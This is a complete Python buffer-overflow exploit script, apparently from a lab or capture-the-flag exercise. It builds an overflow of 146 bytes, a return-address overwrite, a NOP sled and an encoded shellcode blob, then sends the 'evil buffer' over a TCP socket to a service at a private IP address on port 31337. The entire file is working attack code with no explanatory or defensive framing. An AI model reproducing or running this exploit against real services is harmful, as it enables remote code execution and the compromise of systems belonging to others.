import socket

ip = "172.20.192.1"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90"*100

payload = ("\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xb5\xf1\x7a\x85\x83\xee\xfc\xe2\xf4\x49\x19\xf8\x85"
"\xb5\xf1\x1a\x0c\x50\xc0\xba\xe1\x3e\xa1\x4a\x0e\xe7\xfd"
"\xf1\xd7\xa1\x7a\x08\xad\xba\x46\x30\xa3\x84\x0e\xd6\xb9"
"\xd4\x8d\x78\xa9\x95\x30\xb5\x88\xb4\x36\x98\x77\xe7\xa6"
"\xf1\xd7\xa5\x7a\x30\xb9\x3e\xbd\x6b\xfd\x56\xb9\x7b\x54"
"\xe4\x7a\x23\xa5\xb4\x22\xf1\xcc\xad\x12\x40\xcc\x3e\xc5"
"\xf1\x84\x63\xc0\x85\x29\x74\x3e\x77\x84\x72\xc9\x9a\xf0"
"\x43\xf2\x07\x7d\x8e\x8c\x5e\xf0\x51\xa9\xf1\xdd\x91\xf0"
"\xa9\xe3\x3e\xfd\x31\x0e\xed\xed\x7b\x56\x3e\xf5\xf1\x84"
"\x65\x78\x3e\xa1\x91\xaa\x21\xe4\xec\xab\x2b\x7a\x55\xae"
"\x25\xdf\x3e\xe3\x91\x08\xe8\x99\x49\xb7\xb5\xf1\x12\xf2"
"\xc6\xc3\x25\xd1\xdd\xbd\x0d\xa3\xb2\x0e\xaf\x3d\x25\xf0"
"\x7a\x85\x9c\x35\x2e\xd5\xdd\xd8\xfa\xee\xb5\x0e\xaf\xd5"
"\xe5\xa1\x2a\xc5\xe5\xb1\x2a\xed\x5f\xfe\xa5\x65\x4a\x24"
"\xed\xef\xb0\x99\xd6\x91\x73\x9f\x12\x87\xb5\xe0\x26\x0c"
"\x53\x9b\x6a\xd3\xe2\x99\xe3\x20\xc1\x90\x85\x50\x30\x31"
"\x0e\x89\x4a\xbf\x72\xf0\x59\x99\x8a\x30\x17\xa7\x85\x50"
"\xdd\x92\x17\xe1\xb5\x78\x99\xd2\xe2\xa6\x4b\x73\xdf\xe3"
"\x23\xd3\x57\x0c\x1c\x42\xf1\xd5\x46\x84\xb4\x7c\x3e\xa1"
"\xa5\x37\x7a\xc1\xe1\xa1\x2c\xd3\xe3\xb7\x2c\xcb\xe3\xa7"
"\x29\xd3\xdd\x88\xb6\xba\x33\x0e\xaf\x0c\x55\xbf\x2c\xc3"
"\x4a\xc1\x12\x8d\x32\xec\x1a\x7a\x60\x4a\x9a\x98\x9f\xfb"
"\x12\x23\x20\x4c\xe7\x7a\x60\xcd\x7c\xf9\xbf\x71\x81\x65"
"\xc0\xf4\xc1\xc2\xa6\x83\x15\xef\xb5\xa2\x85\x50")
buffer = overflow + retn + padding + payload + "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
